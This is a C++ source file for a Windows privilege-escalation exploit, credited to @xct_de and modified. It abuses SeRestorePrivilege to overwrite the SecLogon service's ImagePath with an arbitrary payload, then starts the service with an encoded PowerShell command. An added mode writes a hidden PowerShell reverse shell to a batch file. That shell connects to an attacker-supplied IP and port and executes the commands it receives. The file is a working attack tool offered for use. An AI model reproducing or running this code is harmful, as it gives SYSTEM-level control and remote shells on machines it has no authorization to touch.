#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>

/*
 Exploit SeRestorePrivilege by modifying Seclogon ImagePath
 Author: @xct_de
 Modified to include reverse shell functionality (SigmaPotato style)
 */

void printUsage() {
    std::cout << "Usage:" << std::endl;
    std::cout << "  SeRestoreAbuse.exe <custom_payload>" << std::endl;
    std::cout << "  SeRestoreAbuse.exe -revshell <IP:PORT>" << std::endl;
    std::cout << std::endl;
    std::cout << "Examples:" << std::endl;
    std::cout << "  SeRestoreAbuse.exe \"cmd /c whoami > C:\\test.txt\"" << std::endl;
    std::cout << "  SeRestoreAbuse.exe -revshell 192.168.1.10:4444" << std::endl;
}

std::string generateReverseShellPayload(const std::string& target) {
    // Parse IP:PORT
    size_t colonPos = target.find(':');
    if (colonPos == std::string::npos) {
        std::cerr << "Error: Invalid IP:PORT format. Use IP:PORT (e.g., 192.168.1.10:4444)" << std::endl;
        exit(1);
    }
    
    std::string ip = target.substr(0, colonPos);
    std::string port = target.substr(colonPos + 1);
    
    std::cout << "[+] Creating reverse shell for " << ip << ":" << port << std::endl;
    
    // Create batch script for better service compatibility
    std::string batchContent = "@echo off\r\n";
    batchContent += "echo [+] Service executing reverse shell attempt > C:\\Windows\\Temp\\revshell.log\r\n";
    batchContent += "powershell.exe -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('" + ip + "'," + port + ");";
    batchContent += "$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};";
    batchContent += "while(($i=$s.Read($b,0,$b.Length)) -ne 0){";
    batchContent += "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);";
    batchContent += "$r=(iex $d 2>&1|Out-String);";
    batchContent += "$r2=$r+'PS '+(pwd).Path+'> ';";
    batchContent += "$by=([text.encoding]::ASCII).GetBytes($r2);";
    batchContent += "$s.Write($by,0,$by.Length);$s.Flush()};";
    batchContent += "$c.Close()\"\r\n";
    
    // Write batch file
    std::string batchFile = "C:\\Windows\\Temp\\revshell.bat";
    std::ofstream outFile(batchFile);
    if (outFile.is_open()) {
        outFile << batchContent;
        outFile.close();
        std::cout << "[+] Batch file created: " << batchFile << std::endl;
        return "cmd.exe /c \"" + batchFile + "\"";
    }
    
    std::cout << "[-] Failed to create batch file, using fallback" << std::endl;
    return "cmd.exe /c echo REVSHELL_ATTEMPT_" + ip + "_" + port + " > C:\\Windows\\Temp\\shell_test.txt";
}

int main(int argc, char* argv[])
{
    std::string payload;
    bool isReverseShell = false;

    if (argc < 2) {
        printUsage();
        return 1;
    }
    
    // Parse arguments
    if (argc == 3 && std::string(argv[1]) == "-revshell") {
        isReverseShell = true;
        payload = generateReverseShellPayload(std::string(argv[2]));
        std::cout << "[+] Generated reverse shell payload for " << argv[2] << std::endl;
        std::cout << "[+] Final command: " << payload << std::endl;
    }
    else if (argc == 2) {
        payload = argv[1];
        std::cout << "[+] Using custom payload: " << payload << std::endl;
    }
    else {
        printUsage();
        return 1;
    }

    std::cout << "[+] Attempting to enable SeRestorePrivilege..." << std::endl;

    // Enable SeRestorePrivilege
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "[-] Failed to open process token. Error: " << GetLastError() << std::endl;
        return 1;
    }
    
    if (!LookupPrivilegeValue(NULL, SE_RESTORE_NAME, &tkp.Privileges[0].Luid)) {
        std::cerr << "[-] Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
        return 1;
    }
    
    tkp.PrivilegeCount = 1; 
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
    
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
        std::cerr << "[-] Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
        return 1;
    }
    
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "[-] SeRestorePrivilege not available or not assigned to current user" << std::endl;
        return 1;
    }
    
    std::cout << "[+] SeRestorePrivilege enabled successfully" << std::endl;

    // Access SecLogon service registry
    std::cout << "[+] Modifying SecLogon service registry..." << std::endl;
    HKEY hKey;
    LONG lResult = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services\\SecLogon",
        0,
        NULL,
        REG_OPTION_BACKUP_RESTORE,
        KEY_SET_VALUE,
        NULL,
        &hKey,
        NULL);
    
    if (lResult != ERROR_SUCCESS) {
        std::cerr << "[-] Failed to access registry key. Error: " << lResult << std::endl;
        return 1;
    }

    // Set ImagePath to payload
    lResult = RegSetValueExA(
        hKey, 
        "ImagePath", 
        0, 
        REG_SZ,
        reinterpret_cast<const BYTE*>(payload.c_str()), 
        static_cast<DWORD>(payload.length() + 1));
    
    RegCloseKey(hKey);
    
    if (lResult != ERROR_SUCCESS) {
        std::cerr << "[-] Failed to modify ImagePath. Error: " << lResult << std::endl;
        return 1;
    }
    
    std::cout << "[+] Successfully modified ImagePath" << std::endl;

    // Start service
    std::cout << "[+] Starting SecLogon service..." << std::endl;
    if (isReverseShell) {
        std::cout << "[!] Reverse shell payload set. Make sure your listener is ready!" << std::endl;
    }
    
    int result = system("powershell -exec bypass -enc ZwBlAHQALQBzAGUAcgB2AGkAYwBlACAAcwBlAGMAbABvAGcAbwBuACAAfAAgAHMAdABhAHIAdAAtAHMAZQByAHYAaQBjAGUA");
    
    if (result == 0) {
        std::cout << "[+] Service started successfully" << std::endl;
    } else {
        std::cout << "[!] Service start completed with exit code: " << result << std::endl;
    }
    
    std::cout << "[+] Exploit completed" << std::endl;
    return 0;
}
